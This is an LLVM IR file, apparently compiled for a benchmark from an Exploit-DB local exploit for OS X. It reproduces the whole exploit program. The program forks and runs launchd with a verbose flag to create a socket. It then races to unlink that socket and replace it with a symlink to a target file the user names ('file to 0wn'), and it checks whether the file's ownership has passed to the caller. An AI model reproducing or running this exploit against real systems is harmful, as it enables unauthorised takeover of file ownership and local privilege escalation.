; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_1043.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_1043.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64 }

@SLEEP = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"%s <file to 0wn>\0A\00", align 1
@DEBUG = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [14 x i8] c"Going for %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"Using usleep %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [54 x i8] c"/sbin/launchd -v /bin/ls -R /var/launchd/ 2>/dev/null\00", align 1
@.str.4 = private unnamed_addr constant [58 x i8] c"/sbin/launchd -v /bin/ls -R /var/launchd/ >/dev/null 2>&1\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"/var/launchd/%d.%d/sock\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"Checking %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"Removing sock...\0A\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"unlink\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"symlink\00", align 1
@.str.10 = private unnamed_addr constant [29 x i8] c"Created symlink %s -> %s...\0A\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"Looks like we got it\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [100 x i8], align 16
  %10 = alloca [100 x i8], align 16
  %11 = alloca %struct.stat*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @SLEEP, align 4
  store i32 %12, i32* %8, align 4
  %13 = call i64 @malloc(i32 8)
  %14 = inttoptr i64 %13 to %struct.stat*
  store %struct.stat* %14, %struct.stat** %11, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %24

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @fprintf(i32 %18, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 2
  br i1 %26, label %27, label %37

27:                                               ; preds = %24
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %8, align 4
  %32 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @strncpy(i8* %32, i8* %35, i32 99)
  br label %43

37:                                               ; preds = %24
  %38 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strncpy(i8* %38, i8* %41, i32 99)
  br label %43

43:                                               ; preds = %37, %27
  br label %44

44:                                               ; preds = %43
  %45 = load i64, i64* @DEBUG, align 8
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %50

47:                                               ; preds = %44
  %48 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i8* %48)
  br label %50

50:                                               ; preds = %47, %44
  %51 = load i64, i64* @DEBUG, align 8
  %52 = icmp ne i64 %51, 0
  br i1 %52, label %53, label %56

53:                                               ; preds = %50
  %54 = load i32, i32* %8, align 4
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i32 %54)
  br label %56

56:                                               ; preds = %53, %50
  %57 = call i64 (...) @fork()
  store i64 %57, i64* %6, align 8
  %58 = load i64, i64* %6, align 8
  %59 = icmp eq i64 %58, 0
  br i1 %59, label %60, label %68

60:                                               ; preds = %56
  %61 = load i64, i64* @DEBUG, align 8
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %65

63:                                               ; preds = %60
  %64 = call i32 @system(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  br label %67

65:                                               ; preds = %60
  %66 = call i32 @system(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.4, i64 0, i64 0))
  br label %67

67:                                               ; preds = %65, %63
  br label %129

68:                                               ; preds = %56
  %69 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %70 = call i64 (...) @getuid()
  %71 = load i64, i64* %6, align 8
  %72 = add nsw i64 %71, 2
  %73 = call i32 @snprintf(i8* %69, i32 99, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0), i64 %70, i64 %72)
  %74 = load i64, i64* @DEBUG, align 8
  %75 = icmp ne i64 %74, 0
  br i1 %75, label %76, label %79

76:                                               ; preds = %68
  %77 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i8* %77)
  br label %79

79:                                               ; preds = %76, %68
  %80 = load i32, i32* %8, align 4
  %81 = call i32 @usleep(i32 %80)
  %82 = load i64, i64* @DEBUG, align 8
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %86

84:                                               ; preds = %79
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0))
  br label %86

86:                                               ; preds = %84, %79
  %87 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %88 = call i64 @unlink(i8* %87)
  %89 = icmp ne i64 %88, 0
  br i1 %89, label %90, label %96

90:                                               ; preds = %86
  %91 = load i64, i64* @DEBUG, align 8
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %93, label %95

93:                                               ; preds = %90
  %94 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  br label %95

95:                                               ; preds = %93, %90
  br label %116

96:                                               ; preds = %86
  %97 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %98 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %99 = call i64 @symlink(i8* %97, i8* %98)
  %100 = icmp ne i64 %99, 0
  br i1 %100, label %101, label %107

101:                                              ; preds = %96
  %102 = load i64, i64* @DEBUG, align 8
  %103 = icmp ne i64 %102, 0
  br i1 %103, label %104, label %106

104:                                              ; preds = %101
  %105 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  br label %106

106:                                              ; preds = %104, %101
  br label %115

107:                                              ; preds = %96
  %108 = load i64, i64* @DEBUG, align 8
  %109 = icmp ne i64 %108, 0
  br i1 %109, label %110, label %114

110:                                              ; preds = %107
  %111 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %112 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.10, i64 0, i64 0), i8* %111, i8* %112)
  br label %114

114:                                              ; preds = %110, %107
  br label %115

115:                                              ; preds = %114, %106
  br label %116

116:                                              ; preds = %115, %95
  %117 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %118 = load %struct.stat*, %struct.stat** %11, align 8
  %119 = call i32 @stat(i8* %117, %struct.stat* %118)
  %120 = load %struct.stat*, %struct.stat** %11, align 8
  %121 = getelementptr inbounds %struct.stat, %struct.stat* %120, i32 0, i32 0
  %122 = load i64, i64* %121, align 8
  %123 = call i64 (...) @getuid()
  %124 = icmp eq i64 %122, %123
  br i1 %124, label %125, label %128

125:                                              ; preds = %116
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %127 = call i32 @usleep(i32 10000000)
  br label %128

128:                                              ; preds = %125, %116
  br label %129

129:                                              ; preds = %128, %67
  %130 = load i32, i32* %3, align 4
  ret i32 %130
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i64, i64) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i64 @unlink(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @symlink(i8*, i8*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
